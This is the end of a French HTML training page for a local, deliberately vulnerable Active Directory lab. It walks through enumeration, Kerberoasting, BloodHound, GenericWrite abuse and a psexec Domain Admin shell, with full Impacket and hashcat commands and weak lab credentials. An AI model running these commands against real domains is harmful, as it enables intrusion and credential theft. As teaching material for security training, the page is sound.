                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>V√©rifier connectivit√© RDP : localhost:3389 (DC)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Attendre promotion DC (~10 minutes)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Joindre les clients au domaine CYBERLAB.LOCAL</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üîß Acc√®s RDP</h4>
                                    <p><strong>DC :</strong> localhost:3389 (Administrator/CyberLab2024!)<br>
                                    <strong>CLI01 :</strong> localhost:3390 (localuser/password123)<br>
                                    <strong>CLI02 :</strong> localhost:3391 (localuser/password123)</p>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="deployWindowsLab()">üöÄ D√©ployer Lab Windows</button>
                                    <button class="btn btn-success" onclick="validateWinStep1()">‚úÖ Valider l'√©tape</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 2: Reconnaissance & Enum√©ration -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">2</div>
                        <div class="step-title">Reconnaissance & √ânum√©ration AD</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö √ânum√©ration Active Directory</div>
                            
                            <div class="docker-concept">
                                <h4>üîç Services √† √ânum√©rer</h4>
                                <p>
                                ‚Ä¢ <strong>Port 53 :</strong> DNS (noms de domaine)<br>
                                ‚Ä¢ <strong>Port 88 :</strong> Kerberos (authentication)<br>
                                ‚Ä¢ <strong>Port 139/445 :</strong> SMB (partages r√©seau)<br>
                                ‚Ä¢ <strong>Port 389 :</strong> LDAP (annuaire AD)<br>
                                ‚Ä¢ <strong>Port 3389 :</strong> RDP (acc√®s distant)
                                </p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üõ†Ô∏è Outils d'√ânum√©ration</h4>
                                <p>
                                ‚Ä¢ <strong>nmap :</strong> Scan ports et services<br>
                                ‚Ä¢ <strong>enum4linux :</strong> Enum√©ration SMB/NetBIOS<br>
                                ‚Ä¢ <strong>ldapsearch :</strong> Requ√™tes LDAP<br>
                                ‚Ä¢ <strong>smbclient :</strong> Acc√®s aux partages
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üîç √ânum√©ration Pratique</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 2: Reconnaissance R√©seau</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Kali Linux - √ânum√©ration AD
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ nmap -sV -p 53,88,135,139,389,445,636,3268,3389 172.35.0.10</div>
                                        <div class="output">PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Windows Kerberos
139/tcp  open  netbios-ssn  Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows AD LDAP
445/tcp  open  microsoft-ds Windows Server 2019 DC</div>
                                        <div class="command">$ enum4linux -a 172.35.0.10</div>
                                        <div class="output">[+] Domain Information:
Domain Name: CYBERLAB
Domain SID: S-1-5-21-xxx-xxx-xxx</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Scanner le DC avec nmap (ports AD classiques)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>√ânum√©rer avec enum4linux (users, groups, shares)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Lister les partages SMB anonymes</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©couvrir les utilisateurs du domaine</span>
                                    </div>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="openKaliTerminal()">üñ•Ô∏è Acc√®s Kali</button>
                                    <button class="btn btn-warning" onclick="copyEnumCommands()">üìã Copier Commandes</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 3: Attaques Kerberos -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">3</div>
                        <div class="step-title">Attaques Kerberos (Kerberoasting & ASREPRoasting)</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Attaques Kerberos</div>
                            
                            <div class="docker-concept">
                                <h4>üé´ Kerberoasting</h4>
                                <p>Attaque contre les comptes de service (SPN) pour r√©cup√©rer les hashes TGS et les casser offline avec hashcat/john.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üé™ ASREPRoasting</h4>
                                <p>Exploitation des comptes avec "Do not require Kerberos preauthentication" pour obtenir des hashes AS-REP.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîì Comptes Vuln√©rables Configur√©s</h4>
                                <p>
                                ‚Ä¢ <strong>svc-web :</strong> Service HTTP/web avec SPN<br>
                                ‚Ä¢ <strong>svc-sql :</strong> Service SQL avec SPN<br>
                                ‚Ä¢ <strong>user-nopreauth :</strong> Compte sans pr√©-auth<br>
                                ‚Ä¢ <strong>admin-weak :</strong> Admin avec mot de passe faible
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üéØ Exploitation Kerberos</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 3: Kerberoasting Attack</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Impacket - Kerberoasting
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10</div>
                                        <div class="output">[*] Discovering SPN accounts...
ServicePrincipalName    Name     MemberOf
HTTP/web.cyberlab.local svc-web  CN=Service Accounts,CN=Users</div>
                                        <div class="command">$ GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10 -request</div>
                                        <div class="output">$krb5tgs$23$*svc-web$CYBERLAB.LOCAL$HTTP/web*$...</div>
                                        <div class="command">$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>√ânum√©rer les SPNs avec GetUserSPNs.py</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>R√©cup√©rer les tickets TGS (-request)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Casser les hashes avec hashcat</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Tenter ASREPRoasting avec GetNPUsers.py</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üîê Credentials d'acc√®s initial</h4>
                                    <p><strong>user1:</strong>password123 (utilisateur domaine basique)<br>
                                    <strong>guest:</strong> (compte invit√© activ√©)<br>
                                    <strong>Null session:</strong> SMB anonyme activ√©</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 4: Mouvement Lat√©ral & BloodHound -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">4</div>
                        <div class="step-title">Mouvement Lat√©ral & Cartographie BloodHound</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Cartographie & Mouvement Lat√©ral</div>
                            
                            <div class="docker-concept">
                                <h4>ü©∏ BloodHound</h4>
                                <p>Outil de cartographie des relations Active Directory pour identifier les chemins d'attaque vers les comptes privil√©gi√©s.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîÑ Techniques de Mouvement</h4>
                                <p>
                                ‚Ä¢ <strong>Pass-the-Hash :</strong> Utilisation des hashes NTLM<br>
                                ‚Ä¢ <strong>Pass-the-Ticket :</strong> R√©utilisation tickets Kerberos<br>
                                ‚Ä¢ <strong>Golden Ticket :</strong> Forge de tickets Kerberos<br>
                                ‚Ä¢ <strong>DCSync :</strong> Extraction des hashes via replication
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">ü©∏ BloodHound & Post-Exploitation</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 4: Cartographie du Domaine</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        BloodHound Collection
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ bloodhound-python -d CYBERLAB.LOCAL -u user1 -p password123 -gc WIN-DC01.CYBERLAB.LOCAL -c all</div>
                                        <div class="output">[*] Connecting to LDAP server: WIN-DC01.CYBERLAB.LOCAL
[*] Found 1 domains
[*] Found 1 domains in the forest
[*] Generating computers.json
[*] Generating users.json</div>
                                        <div class="command">$ sudo neo4j console</div>
                                        <div class="command">$ bloodhound</div>
                                        <div class="output">[Interface BloodHound s'ouvre]</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Collecter les donn√©es AD avec bloodhound-python</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©marrer Neo4j et BloodHound GUI</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Importer les donn√©es JSON dans BloodHound</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Analyser "Shortest path to Domain Admins"</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üéØ Chemins d'attaque pr√©par√©s</h4>
                                    <p><strong>user1 ‚Üí svc-web :</strong> Kerberoasting<br>
                                    <strong>svc-web ‚Üí admin-weak :</strong> Droits GenericWrite<br>
                                    <strong>admin-weak ‚Üí Domain Admins :</strong> Membre du groupe</p>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="startBloodHound()">ü©∏ D√©marrer BloodHound</button>
                                    <button class="btn btn-warning" onclick="downloadBloodHoundData()">üì• T√©l√©charger Donn√©es</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 5: Escalade de Privil√®ges -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">5</div>
                        <div class="step-title">Escalade de Privil√®ges & Domain Admin</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Escalade de Privil√®ges AD</div>
                            
                            <div class="docker-concept">
                                <h4>üëë Objectif: Domain Admin</h4>
                                <p>Techniques d'escalade configur√©es dans le lab pour atteindre les privil√®ges Domain Administrator.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîê Techniques Disponibles</h4>
                                <p>
                                ‚Ä¢ <strong>GPO Abuse :</strong> Modification des GPO<br>
                                ‚Ä¢ <strong>Constrained Delegation :</strong> S4U2Proxy<br>
                                ‚Ä¢ <strong>Unconstrained Delegation :</strong> Capture de tickets<br>
                                ‚Ä¢ <strong>ACL Abuse :</strong> GenericAll/GenericWrite
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üëë Chemin vers Domain Admin</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 5: Exploitation Finale</div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Exploiter les droits GenericWrite sur admin-weak</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Modifier le mot de passe ou ajouter un SPN</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Utiliser les credentials admin-weak</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Obtenir un shell en tant que Domain Admin</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Exfiltrer les secrets AD (DCSync)</span>
                                    </div>
                                </div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Domain Admin Achievement
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ psexec.py CYBERLAB/admin-weak:newpassword123@172.35.0.10</div>
                                        <div class="output">[*] Requesting shares on 172.35.0.10.....
[*] Found writable share ADMIN$
[*] Uploading file [...] 
[*] Opening SVCManager on 172.35.0.10.....
[*] Starting service [...] on 172.35.0.10.....
[*] Got shell! üéâ</div>
                                        <div class="command">C:\Windows\system32> whoami</div>
                                        <div class="output">cyberlab\admin-weak</div>
                                        <div class="command">C:\Windows\system32> net group "Domain Admins" /domain</div>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 20px; margin: 20px 0;">
                                    <h4 style="color: #ffd700; margin-bottom: 15px;">üèÜ MISSION ACCOMPLIE !</h4>
                                    <p>F√©licitations ! Vous avez compromis enti√®rement le domaine CYBERLAB.LOCAL !</p>
                                    <p><strong>Techniques ma√Ætris√©es :</strong> √ânum√©ration, Kerberoasting, BloodHound, Escalade de privil√®ges</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        // Navigation entre onglets
        function showTab(tabName) {
            // Cacher tous les contenus
            const contents = document.querySelectorAll('.tab-content');
            contents.forEach(content => content.classList.remove('active'));
            
            // D√©sactiver tous les onglets
            const tabs = document.querySelectorAll('.tab');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            // Afficher le contenu s√©lectionn√©
            document.getElementById(tabName).classList.add('active');
            
            // Activer l'onglet s√©lectionn√©
            event.target.classList.add('active');
        }

        // Syst√®me de checkbox
        function toggleCheck(element) {
            element.classList.toggle('checked');
            
            // Compter les cases coch√©es dans la section
            const section = element.closest('.step-card');
            if (section) {
                const checkboxes = section.querySelectorAll('.checkbox');
                const checkedBoxes = section.querySelectorAll('.checkbox.checked');
                
                if (checkedBoxes.length === checkboxes.length) {
                    // Toutes les cases coch√©es - effet de succ√®s
                    section.style.border = '2px solid #28a745';
                    setTimeout(() => {
                        section.style.border = '';
                    }, 2000);
                }
            }
        }

        // Validation des √©tapes
        function validateStep1() {
            const checkboxes = document.querySelectorAll('#portainer .step-card:first-child .checkbox.checked');
            if (checkboxes.length >= 3) {
                alert('üéâ √âtape 1 valid√©e ! Vous ma√Ætrisez les bases de Portainer.\n\n‚úÖ Prochaine √©tape : Explorez les conteneurs CyberLab');
            } else {
                alert('‚ö†Ô∏è Compl√©tez d\'abord toutes les actions de l\'√©tape 1');
            }
        }

        // Fonctions sp√©cifiques au Windows AD Lab
        function deployWindowsLab() {
            alert('üöÄ D√©ploiement du Lab Windows AD...\n\nüìã Actions en cours :\n‚Ä¢ Cr√©ation des conteneurs Windows\n‚Ä¢ Configuration du Domain Controller\n‚Ä¢ Setup des comptes vuln√©rables\n\n‚è±Ô∏è Temps estim√© : 15-20 minutes');
        }

        function validateWinStep1() {
            const checkboxes = document.querySelectorAll('#winlab .step-card:first-child .checkbox.checked');
            if (checkboxes.length >= 3) {
                alert('üéâ Lab Windows d√©ploy√© avec succ√®s !\n\nüñ•Ô∏è Environnement disponible :\n‚Ä¢ Domain Controller : localhost:3389\n‚Ä¢ Client Windows : localhost:3390\n‚Ä¢ Domaine : CYBERLAB.LOCAL\n\nüîú Prochaine √©tape : Reconnaissance r√©seau');
            } else {
                alert('‚ö†Ô∏è Compl√©tez le d√©ploiement avant de continuer');
            }
        }

        function openKaliTerminal() {
            alert('üñ•Ô∏è Acc√®s au conteneur Kali Linux\n\nCommande d\'acc√®s :\ndocker exec -it cyberlab_kali_attacker /bin/bash\n\nüõ†Ô∏è Outils pr√©-install√©s :\n‚Ä¢ nmap, enum4linux\n‚Ä¢ impacket-scripts\n‚Ä¢ bloodhound-python\n‚Ä¢ hashcat, john');
        }

        function copyEnumCommands() {
            const commands = `# √ânum√©ration Active Directory
nmap -sV -p 53,88,135,139,389,445,636,3268,3389 172.35.0.10
enum4linux -a 172.35.0.10
smbclient -L //172.35.0.10 -N
ldapsearch -x -h 172.35.0.10 -b "DC=CYBERLAB,DC=LOCAL"

# Kerberoasting
GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10 -request

# ASREPRoasting  
GetNPUsers.py CYBERLAB.LOCAL/ -usersfile users.txt -no-pass -dc-ip 172.35.0.10`;
            
            navigator.clipboard.writeText(commands).then(() => {
                alert('üìã Commandes d\'√©num√©ration copi√©es !\n\nCollez-les dans votre terminal Kali pour commencer la reconnaissance.');
            });
        }

        function startBloodHound() {
            alert('ü©∏ D√©marrage de BloodHound\n\nüìã √âtapes :\n1. sudo neo4j console\n2. Naviguer vers http://localhost:7474\n3. Login neo4j/neo4j ‚Üí changer le mot de passe\n4. bloodhound (dans un nouveau terminal)\n5. Se connecter avec les nouveaux credentials\n\nüìÅ Importer les fichiers .json collect√©s');
        }

        function downloadBloodHoundData() {
            alert('üì• Collection des donn√©es BloodHound\n\nCommande √† ex√©cuter :\nbloodhound-python -d CYBERLAB.LOCAL -u user1 -p password123 -gc WIN-DC01.CYBERLAB.LOCAL -c all\n\nüìä Fichiers g√©n√©r√©s :\n‚Ä¢ computers.json\n‚Ä¢ users.json\n‚Ä¢ groups.json\n‚Ä¢ domains.json');
        }

        // Animation au chargement
        window.addEventListener('load', () => {
            console.log('üöÄ CyberLab Genesis Guide charg√© !');
            
            // Animation du compteur
            const numbers = document.querySelectorAll('.stat-number');
            numbers.forEach(num => {
                const value = parseInt(num.textContent);
                num.textContent = '0';
                
                let current = 0;
                const increment = value / 30;
                const timer = setInterval(() => {
                    current += increment;
                    if (current >= value) {
                        num.textContent = value + (value === 92 ? '%' : '');
                        clearInterval(timer);
                    } else {
                        num.textContent = Math.floor(current) + (value === 92 ? '%' : '');
                    }
                }, 50);
            });
        });

        // Scroll fluide vers les sections
        function scrollToSection(sectionId) {
            document.getElementById(sectionId).scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    </script>
</body>
</html>
